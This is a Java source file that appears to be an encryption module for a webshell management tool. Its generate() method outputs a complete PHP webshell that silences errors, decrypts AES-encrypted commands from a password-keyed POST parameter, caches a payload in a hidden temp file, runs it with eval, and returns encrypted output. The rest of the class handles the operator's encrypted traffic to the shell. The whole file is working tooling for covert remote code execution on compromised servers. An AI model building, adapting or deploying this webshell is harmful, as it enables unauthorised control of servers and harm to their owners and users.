package shells.cryptions.phpDynamic;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import util.Log;
import util.functions;
import util.http.Http;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.net.URLEncoder;

@CryptionAnnotation(Name = "PHP_CUSTOM_AES_BASE64", payloadName = "PhpDynamicPayload")
public class PhpDynamicAesBase64 implements Cryption {
    private ShellEntity shell;
    private Http http;
    private String pass;
    private String key;
    private byte[] payload;
    private boolean state;
    private String findStrLeft;
    private String findStrRight;
    private Cipher encodeCipher;
    private Cipher decodeCipher;

    @Override
    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.pass = this.shell.getPassword();
        this.key = this.shell.getSecretKeyX();

        try {
            initCipher(this.key);
            String findStrMd5 = functions.md5(this.pass + this.key);
            this.findStrLeft = findStrMd5.substring(0, 16);
            this.findStrRight = findStrMd5.substring(16);

            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }
        } catch (Exception e) {
            Log.error(e);
        }
    }

    @Override
    public byte[] encode(byte[] data) {
        try {
            return E(data);
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override
    public byte[] decode(byte[] data) {
        if (data != null && data.length > 0) {
            try {
                return D(findStr(data));
            } catch (Exception e) {
                Log.error(e);
                return null;
            }
        }
        return data;
    }

    @Override
    public boolean check() {
        return this.state;
    }

    @Override
    public boolean isSendRLData() {
        return true;
    }

    @Override
    public byte[] generate(String password, String secretKey) {
        String keyx = functions.md5(secretKey).substring(0, 16);
        String code =
                "<?php\n" +
                "@session_start();\n" +
                "@set_time_limit(0);\n" +
                "@error_reporting(0);\n" +
                "function aesEnc($data,$key){\n" +
                "    return openssl_encrypt($data,'AES-128-ECB',$key,OPENSSL_RAW_DATA);\n" +
                "}\n" +
                "function aesDec($data,$key){\n" +
                "    return openssl_decrypt($data,'AES-128-ECB',$key,OPENSSL_RAW_DATA);\n" +
                "}\n" +
                "$pass='" + password + "';\n" +
                "$key='" + keyx + "';\n" +
                "$payloadStore = @sys_get_temp_dir() . DIRECTORY_SEPARATOR . '.' . md5($pass.$key) . '.gcache';\n" +
                "if (isset($_POST[$pass])){\n" +
                "    $data = aesDec(base64_decode($_POST[$pass]),$key);\n" +
                "    if ($data === false) { $data = ''; }\n" +
                "    if (@is_file($payloadStore)){\n" +
                "        $payloadEnc = @file_get_contents($payloadStore);\n" +
                "        $payload = aesDec($payloadEnc,$key);\n" +
                "        if ($payload !== false){\n" +
                "            if (strpos($payload,'getBasicsInfo')===false){\n" +
                "                $payload = aesDec($payload,$key);\n" +
                "            }\n" +
                "            @eval($payload);\n" +
                "            $result = @run($data);\n" +
                "            if ($result === null){ $result = ''; }\n" +
                "            echo substr(md5($pass.$key),0,16);\n" +
                "            echo base64_encode(aesEnc($result,$key));\n" +
                "            echo substr(md5($pass.$key),16);\n" +
                "        }\n" +
                "    }else{\n" +
                "        if (strpos($data,'getBasicsInfo')!==false){\n" +
                "            @file_put_contents($payloadStore, aesEnc($data,$key));\n" +
                "        }\n" +
                "    }\n" +
                "}\n";
        return code.getBytes();
    }

    private void initCipher(String keyText) throws Exception {
        byte[] fixedKey = toFixedKey(keyText);
        SecretKeySpec keySpec = new SecretKeySpec(fixedKey, "AES");
        this.encodeCipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        this.encodeCipher.init(Cipher.ENCRYPT_MODE, keySpec);
        this.decodeCipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        this.decodeCipher.init(Cipher.DECRYPT_MODE, keySpec);
    }

    private byte[] E(byte[] data) throws Exception {
        byte[] encrypted = this.encodeCipher.doFinal(data);
        String b64 = functions.base64EncodeToString(encrypted);
        return (this.pass + "=" + URLEncoder.encode(b64, "UTF-8")).getBytes();
    }

    private byte[] D(String data) throws Exception {
        byte[] encrypted = functions.base64Decode(data);
        return this.decodeCipher.doFinal(encrypted);
    }

    private String findStr(byte[] respResult) {
        String htmlString = new String(respResult);
        return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
    }

    private byte[] toFixedKey(String keyText) {
        byte[] src = keyText.getBytes();
        byte[] dst = new byte[16];
        int n = Math.min(src.length, dst.length);
        System.arraycopy(src, 0, dst, 0, n);
        for (int i = n; i < dst.length; i++) {
            dst[i] = (byte) 'a';
        }
        return dst;
    }
}
